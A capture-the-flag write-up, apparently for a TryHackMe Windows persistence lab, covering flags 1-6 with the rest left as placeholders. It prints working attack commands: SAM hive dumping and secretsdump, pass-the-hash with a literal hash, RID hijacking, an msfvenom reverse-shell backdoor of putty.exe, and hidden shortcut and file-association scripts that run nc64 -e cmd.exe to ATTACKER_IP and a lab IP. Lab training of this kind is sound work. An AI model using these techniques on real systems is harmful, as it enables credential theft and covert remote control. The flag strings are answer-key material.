# Windows Local Persistence

### Tampering With Unprivileged Accounts
- Insert flag1 here<br />
We can check that the server has WinRM enabled with the command `Test-WSMan`. <br />
First, add thmuser1 to the backup group: `net localgroup "Backup Operators" thmuser1 /add`, and to the winRM group: `net localgroup "Remote Management Users" thmuser1 /add` Now, we need to disable LocalAccountTokenFilterPolicy, strips any local account of its administrative privileges when logging in remotely. To do that, run `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1`. Now we can download password hashes: 

      reg save hklm\system system.bak
      reg save hklm\sam sam.bak
      download system.bak
      download sam.bak
  
And dump them:

      python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
Then, we perform a pass-the-hash attack: `evil-winrm -i 10.10.62.15 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3`. <br /> Flag is `THM{FLAG_BACKED_UP!}`
- Insert flag2 here<br />
Run `secedit /export /cfg config.inf` to export the configuration file, then open it and edit it by adding our user to the SeBackupPrivilege and SeRestorePrivilege lines: <br />
![image](https://github.com/user-attachments/assets/fa5d5842-8547-4594-89a2-3e218ce924b2)<br />
Now load the configuration back into the system:

      secedit /import /cfg config.inf /db config.sdb
      
      secedit /configure /db config.sdb /cfg config.inf
However, the user still can't log over winRM because it is not in the "Remote Management Users" group.  Instead of adding the user to the Remote Management Users group, we'll change the **security descriptor** associated with the WinRM service to allow thmuser2 to connect. So, run `Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI` on powershell: <br />
![image](https://github.com/user-attachments/assets/a7c6d479-ed38-4560-a179-8fd3d6132b63)<br />
We can now log in the account from our attackbox whenever we want: <br />
![image](https://github.com/user-attachments/assets/ad1387a5-522f-4272-8056-899db8a941dd)<br />
`THM{IM_JUST_A_NORMAL_USER}`

- Insert flag3 here<br />
The SAM is restricted to the SYSTEM account only, so even the Administrator won't be able to edit it. To run Regedit as SYSTEM, we will use psexec: `.\PsExec64.exe -i -s regedit`<br />
Go to HKLM\SAM\SAM\Domains\Account\Users\, and click on 0x3F2, which is the hexadecimal value for 1010(thmuser3 RID).<br />
From there, the value "F" holds the user RID<br />
![image](https://github.com/user-attachments/assets/a2827e8c-f267-40c2-828e-843f93698cda)<br />
Notice that the RID is stored in little endian. The hexadecimal for 500 is 0x1F4, so we will substitute thmuser3's RID with F4 01. Now, as described in the task, log in thmuser3 via RDP: `xfreerdp /u:thmuser3 /p:Password321 /v:10.10.62.15`. Finally, get the flag: <br />
![image](https://github.com/user-attachments/assets/1ad110d7-35a3-4282-abcc-588f2e9f763f)<br />
`THM{TRUST_ME_IM_AN_ADMIN}`

### Backdooring Files
- Insert flag5 here <br />
You can easily plant a payload of your preference in any .exe file with msfvenom. The binary will still work as usual but execute an additional payload silently by adding an extra thread in your binary. To create a backdoored putty.exe, we can use the following command:

            msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
Another way is to change the shortcut file of a .exe in the desktop to point to a script of our own. et's create a simple Powershell script in C:\Windows\System32. The script will execute a reverse shell and then run calc.exe: 

            Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
            
            C:\Windows\System32\calc.exe
The final target for the shortcut is: `powershell.exe -WindowStyle hidden C:\Windows\System32\scirpt.ps1`. `-windowstyle hidden` is important because it won't open a powershell window, which might look a bit sus. 
So change the shortcut, open a netcat listener, and run the calculator. Get the flag:<br />
![image](https://github.com/user-attachments/assets/9a7f08a4-cd60-49cb-95c0-d72e83b2465b)<br />
`THM{NO_SHORTCUTS_IN_LIFE}`

By the way, WHERE THE HELL IS FLAG 4!?
- Insert flag6 here<br />
First, let's create a ps1 script with the following content and save it to C:\Windows\backdoor2.ps1

            Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.11.85.53 4448"
            C:\Windows\system32\NOTEPAD.EXE $args[0]

Now let's change the registry key to run our backdoor script in a hidden window. Move to HKLM\Software\Classes\shell\open\command and edit it: <br />
![image](https://github.com/user-attachments/assets/baa53c54-d822-4755-aa35-31b2d3bbe472)<br />
Finally get the flag: <br />
![image](https://github.com/user-attachments/assets/909c44cc-eff8-41ad-9411-cf8c3bb38762)<br />
`THM{TXT_FILES_WOULD_NEVER_HURT_YOU}`

### Abusing Services
- Insert flag7 here
- Insert flag8 here

### Abusing Scheduled Tasks 
- Insert flag9 here

### Logon Triggered Persistence
- Insert flag10 here
- Insert flag11 here
- Insert flag12 here
- Insert flag13 here

### Backdooring the Login Screen / RDP
- Insert flag14 here
- Insert flag15 here

### Persisting Through Existing Services
- Insert flag16 here
- Insert flag17 here

### 
